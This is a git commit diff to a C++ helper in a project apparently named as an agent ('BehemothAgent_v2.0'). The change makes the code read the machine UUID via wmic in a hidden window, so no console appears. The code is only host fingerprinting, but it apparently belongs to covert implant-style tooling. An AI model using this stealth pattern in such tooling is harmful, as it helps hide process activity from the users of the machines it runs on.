9664d97969d5a3c6e1be066c9ad4446f41a7feb1
0xConstant <noroh4xy@protonmail.com>
2023-10-09 07:44:24 -0700

    updated gen_uid.cpp to return uuid without showing a cmd window

--- BehemothAgent_v2.0/Helpers/gen_uid.cpp
+++ BehemothAgent_v2.0/Helpers/gen_uid.cpp
@@ -1,25 +1,75 @@
 #include <cryptopp/sha3.h>
 #include <cryptopp/filters.h>
 #include <cryptopp/hex.h>
+#include <Windows.h>
 #include "gen_uid.h"
 
 
 
 std::string GetUUID() {
-    char uuid[100];
-    FILE* fp = _popen("wmic csproduct get uuid", "r");
-    if (fp == nullptr) {
-        return "";
-    }
-    int i = 0;
-    while (fgets(uuid, sizeof(uuid) - 1, fp) != nullptr) {
-        i++;
-        if (i == 2) break;
-    }
-    _pclose(fp);
-    std::string uuidStr(uuid);
-    uuidStr.erase(std::remove(uuidStr.begin(), uuidStr.end(), '\n'), uuidStr.end());
-    return uuidStr;
+	char uuid[100] = { 0 }; // Initializing with zeros
+	SECURITY_ATTRIBUTES sa;
+	sa.nLength = sizeof(sa);
+	sa.lpSecurityDescriptor = NULL;
+	sa.bInheritHandle = TRUE;
+
+	HANDLE hRead, hWrite;
+	if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
+		return "";
+	}
+
+	STARTUPINFO si;
+	PROCESS_INFORMATION pi;
+
+	ZeroMemory(&si, sizeof(si));
+	si.cb = sizeof(si);
+	si.hStdError = hWrite;
+	si.hStdOutput = hWrite;
+	si.hStdInput = hRead;
+	si.dwFlags |= STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+	si.wShowWindow = SW_HIDE;
+
+	ZeroMemory(&pi, sizeof(pi));
+
+	WCHAR cmd[] = L"wmic csproduct get uuid";
+	if (!CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
+		CloseHandle(hWrite);
+		CloseHandle(hRead);
+		return "";
+	}
+
+	WaitForSingleObject(pi.hProcess, INFINITE);
+	DWORD bytesRead;
+	if (!ReadFile(hRead, uuid, sizeof(uuid) - 1, &bytesRead, NULL) || bytesRead == 0) {
+		CloseHandle(hWrite);
+		CloseHandle(hRead);
+		CloseHandle(pi.hProcess);
+		CloseHandle(pi.hThread);
+		return "";
+	}
+
+	CloseHandle(hWrite);
+	CloseHandle(hRead);
+	CloseHandle(pi.hProcess);
+	CloseHandle(pi.hThread);
+
+	std::string uuidStr(uuid);
+
+	// Remove "UUID" prefix and any leading whitespace
+	std::size_t pos = uuidStr.find("UUID");
+	if (pos != std::string::npos) {
+		uuidStr = uuidStr.substr(pos + 4); // Removes "UUID"
+	}
+
+	// Trim leading and trailing spaces, and null characters.
+	uuidStr.erase(uuidStr.begin(), std::find_if(uuidStr.begin(), uuidStr.end(), [](unsigned char ch) {
+		return !std::isspace(ch) && ch != '\0';
+		}));
+	uuidStr.erase(std::find_if(uuidStr.rbegin(), uuidStr.rend(), [](unsigned char ch) {
+		return !std::isspace(ch) && ch != '\0';
+		}).base(), uuidStr.end());
+
+	return uuidStr;
 }
 
 
